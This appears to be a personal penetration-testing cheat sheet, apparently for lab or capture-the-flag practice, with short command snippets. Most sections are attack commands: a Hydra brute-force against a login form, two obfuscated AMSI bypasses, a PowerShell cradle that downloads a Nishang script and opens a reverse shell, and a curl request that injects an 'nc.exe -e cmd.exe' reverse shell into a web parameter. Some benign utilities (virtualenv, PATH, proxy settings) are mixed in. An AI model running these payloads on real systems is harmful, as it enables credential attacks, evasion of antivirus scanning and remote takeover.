
>[!code]- Recursively...
>###### Cat files
>```powershell
>#All
>find . -type f -exec cat {} + 2>/dev/null
># Non-binary files only
>find . -type f -exec sh -c 'file --mime {} | grep -vq "charset=binary" && cat {}' \;
># Output filenames too
>find . -type f -exec sh -c 'file --mime {} | grep -vq "charset=binary" && echo "=== {} ===" && cat {}' \;
>```
>###### Ls...
>```powershell
># Files
>ls -alR 2>/dev/null
>dir /S
>gci -recurse
>
># Directories
>gci -path "C:\" -directory -recurse -erroraction silentlycontinue
>```
>###### Find
>```powershell
>Get-ChildItem -Path "C:\" -Filter "local.txt" -Recurse -ErrorAction SilentlyContinue
>```

>[!code]- Brute force login
>###### Hydra
>```powershell
>hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
>```

>[!code]- Virtual python environment
>Must use a verson of virtualenv <= 20.21.1 as [later versions don't support python2 virtual environments](https://stackoverflow.com/questions/76380381/create-virtualenv-for-python-2-7-with-python-3-10).
>
>```powershell
># Create Python2 virtualenv (perhaps in folder of python script)
>virtualenv -p /usr/bin/python2 ./virtualenvs/2/env
>
># Create Python3 virtualenv
>virtualenv ./virtualenvs/3/env
>
># Activate virtualenv
>source ./virtualenvs/2/bin/activate
>
># Deactivate
>deactivate
>```

>[!code]- TTY shell
>
>```powershell
>python -c 'import pty;pty.spawn("/bin/bash")'
>
>ctrl+z
>stty raw -echo; fg
>
>export TERM=xterm-256color
>```

>[!code]- Bypass AMSI
>###### Not checked as working
>```powershell
>sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
>```
>Or
>```
>S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
>```

>[!code]- PowerShell encoded reverse shell
>###### Setup listener to server nishang-ps-rev.ps1 (6666) & catch the reverse shell (5555)
>###### Encode a payload [via CyberChef](https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')&input=SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8vMTAuMTAuWC5ZL05pc2hhbmctSW52b2tlLVBvd2VyU2hlbGxUY3AucHMxIik7IEludm9rZS1Qb3dlclNoZWxsVGNwIC1SZXZlcnNlIC1JUEFkZHJlc3MgMTAuMTAuWC5ZIC1Qb3J0IDEwMDA7IFdyaXRlLUhvc3QgIkJ1YmJ6Ig)
>```powershell
>IEX (New-Object Net.WebClient).DownloadString("http://10.10.X.Y/Nishang-Invoke-PowerShellTcp.ps1"); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.X.Y -Port 1000; Write-Host "Bubbz"
>```
>###### Execute the payload
>```powershell
>powershell -enc SQBFAF...BoAGUAaABlACIA
>```

>[!code]- Edit environmental PATH variable
>###### Windows
>```powershell
># Execute cmd and PS commands
>set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
>
>set PATH=%SystemRoot%\system32;%SystemRoot%;
>```

>[!code]- Auto URL-encode curl requests
>###### `-G --dataurlencode`
>```powershell
># General structure
>curl -G --data-urlencode `<parameter>=<parameter value>`  `<web address>`
>
># Example
>curl -G --data-urlencode '0=nc.exe -e cmd.exe 192.168.45.211 445' http://192.168.120.189:8080/commander.php
>
># Which is equivalent to
>http://192.168.120.189:8080/commander.php?0=nc.exe%20-e%20cmd.exe%20192.168.45.211%20445
>```

>[!code]- Paste a multi-line string into a file with EOF
>###### Linux
>Where you type the first line, paste in the multi-line string, then type EOF
>
>![Pasted image 20241211063448](Images/Pasted%20image%2020241211063448.png)

>[!code]- Route traffic through a proxy (Burp)
>###### Curl
>```powershell
># /etc/proxychains4.conf
>http 127.0.0.1 8080
># ----
>proxychains curl http://172.168.16.3:80
>```
>###### Nmap
>```powershell
># Not all Nmap features support the --proxies command
>nmap --proxies http://127.0.0.1:8080 SERVER_IP -p PORT -Pn -sC
>
>proxychains nmap # nmap commands
>```
>###### Metasploit
>```powershell
># Set a proxy for any exploit
># (with an exploit selected)
>set PROXIES HTTP:127.0.0.1:8080
>```